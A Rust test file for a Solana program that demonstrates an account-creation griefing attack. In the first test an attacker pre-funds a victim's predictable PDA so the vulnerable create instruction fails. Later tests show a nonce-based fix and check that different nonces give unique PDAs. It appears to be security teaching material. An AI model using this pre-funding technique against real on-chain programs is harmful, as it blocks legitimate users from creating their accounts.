//! Tests for the Account Creation Griefing vulnerability
//!
//! Demonstrates how pre-funding a PDA can block account creation

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use litesvm::LiteSVM;
    use solana_instruction::{AccountMeta, Instruction};
    use solana_keypair::Keypair;
    use solana_message::Message;
    use solana_native_token::LAMPORTS_PER_SOL;
    use solana_pubkey::Pubkey;
    use solana_signer::Signer;
    use solana_transaction::Transaction;

    fn program_id() -> Pubkey {
        let keypair_path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .unwrap()
            .join("target/deploy/account_griefing-keypair.json");

        let keypair_bytes: Vec<u8> = serde_json::from_str(
            &std::fs::read_to_string(&keypair_path).expect("Failed to read keypair"),
        )
        .expect("Failed to parse keypair");

        Keypair::from_bytes(&keypair_bytes).unwrap().pubkey()
    }

    fn read_program() -> Vec<u8> {
        let so_path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .unwrap()
            .join("target/deploy/account_griefing.so");
        std::fs::read(so_path).expect("Failed to read program file")
    }

    fn discriminator(name: &str) -> [u8; 8] {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(format!("global:{}", name).as_bytes());
        let result = hasher.finalize();
        let mut disc = [0u8; 8];
        disc.copy_from_slice(&result[..8]);
        disc
    }

    fn setup() -> (LiteSVM, Keypair) {
        let mut svm = LiteSVM::new();
        let payer = Keypair::new();
        svm.airdrop(&payer.pubkey(), 10 * LAMPORTS_PER_SOL)
            .expect("Airdrop failed");
        svm.add_program(program_id(), &read_program());
        (svm, payer)
    }

    #[test]
    fn test_griefing_attack_blocks_creation() {
        let (mut svm, victim) = setup();
        let pid = program_id();

        // Victim's predictable PDA
        let (vulnerable_pda, _bump) = Pubkey::find_program_address(
            &[b"stake", victim.pubkey().as_ref()],
            &pid,
        );

        // Attacker pre-funds the PDA
        let attacker = Keypair::new();
        svm.airdrop(&attacker.pubkey(), 1 * LAMPORTS_PER_SOL)
            .expect("Airdrop failed");

        // Griefing: send minimal lamports to victim's stake PDA
        let griefing_amount = 890_880; // Minimum rent-exempt for small account
        let transfer_ix = solana_system_interface::instruction::transfer(
            &attacker.pubkey(),
            &vulnerable_pda,
            griefing_amount,
        );
        let msg = Message::new(&[transfer_ix], Some(&attacker.pubkey()));
        let tx = Transaction::new(&[&attacker], msg, svm.latest_blockhash());
        let result = svm.send_transaction(tx);
        println!("Griefing transfer result: {:?}", result);
        assert!(result.is_ok(), "Griefing transfer should succeed");

        // Verify PDA now has lamports
        let pda_account = svm.get_account(&vulnerable_pda);
        assert!(pda_account.is_some(), "PDA should have lamports");
        println!("PDA balance after griefing: {} lamports", pda_account.unwrap().lamports);

        // Now victim tries to create their stake account
        let create_ix = Instruction {
            program_id: pid,
            accounts: vec![
                AccountMeta::new(victim.pubkey(), true),
                AccountMeta::new(vulnerable_pda, false),
                AccountMeta::new_readonly(solana_sdk_ids::system_program::ID, false),
            ],
            data: discriminator("vulnerable_create_stake").to_vec(),
        };

        let msg = Message::new(&[create_ix], Some(&victim.pubkey()));
        let tx = Transaction::new(&[&victim], msg, svm.latest_blockhash());
        let result = svm.send_transaction(tx);
        
        // This should FAIL because the PDA already has lamports
        println!("Victim create stake result: {:?}", result);
        assert!(result.is_err(), "VULNERABLE: Create should fail when PDA is pre-funded!");
        println!("EXPLOIT SUCCESS: Victim blocked from creating stake account!");
    }

    #[test]
    fn test_secure_version_unpredictable() {
        let (mut svm, user) = setup();
        let pid = program_id();

        // User chooses a random nonce
        let nonce: u64 = 847291; // Random value known only to user

        // Secure PDA with nonce
        let (secure_pda, _bump) = Pubkey::find_program_address(
            &[b"stake", user.pubkey().as_ref(), &nonce.to_le_bytes()],
            &pid,
        );

        // Attacker cannot predict this address without knowing nonce
        let attacker_guess_nonce: u64 = 12345; // Wrong guess
        let (attacker_guess_pda, _) = Pubkey::find_program_address(
            &[b"stake", user.pubkey().as_ref(), &attacker_guess_nonce.to_le_bytes()],
            &pid,
        );

        assert_ne!(secure_pda, attacker_guess_pda);
        println!("User's actual PDA: {}", secure_pda);
        println!("Attacker's guess: {}", attacker_guess_pda);
        println!("SECURE: Attacker cannot predict user's PDA without nonce!");

        // User can successfully create their stake account
        let mut data = discriminator("secure_create_stake").to_vec();
        data.extend_from_slice(&nonce.to_le_bytes());

        let create_ix = Instruction {
            program_id: pid,
            accounts: vec![
                AccountMeta::new(user.pubkey(), true),
                AccountMeta::new(secure_pda, false),
                AccountMeta::new_readonly(solana_sdk_ids::system_program::ID, false),
            ],
            data,
        };

        let msg = Message::new(&[create_ix], Some(&user.pubkey()));
        let tx = Transaction::new(&[&user], msg, svm.latest_blockhash());
        let result = svm.send_transaction(tx);
        
        println!("Secure create stake result: {:?}", result);
    }

    #[test]
    fn test_different_nonces_different_pdas() {
        let pid = program_id();
        let user = Keypair::new();

        // Same user, different nonces = different PDAs
        let nonces: Vec<u64> = vec![1, 2, 42, 999, u64::MAX];
        let mut pdas: Vec<Pubkey> = Vec::new();

        for nonce in nonces.iter() {
            let (pda, _) = Pubkey::find_program_address(
                &[b"stake", user.pubkey().as_ref(), &nonce.to_le_bytes()],
                &pid,
            );
            pdas.push(pda);
            println!("Nonce {} -> PDA {}", nonce, pda);
        }

        // All PDAs should be unique
        for i in 0..pdas.len() {
            for j in (i + 1)..pdas.len() {
                assert_ne!(pdas[i], pdas[j], "PDAs should be unique for different nonces");
            }
        }
        println!("VERIFIED: Each nonce produces a unique PDA");
    }
}
